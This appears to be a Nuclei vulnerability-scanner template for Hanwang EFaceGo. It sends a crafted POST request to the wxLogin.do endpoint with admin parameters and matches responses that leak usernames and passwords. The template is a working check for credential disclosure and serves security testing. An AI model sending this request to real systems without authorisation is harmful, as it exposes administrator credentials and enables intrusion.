id: HanWangEFaceGO-wxLogin-LeakInfo

info:
  name: HanWangEFaceGO-wxLogin-LeakInfo
  author: iSee857
  severity: high
  description: |
    HanWangEFaceGO-wxLogin-LeakInfo

http:
  - raw:
      - |
        POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "userName"
          - "password"
        condition: and

      - type: status
        status:
          - 200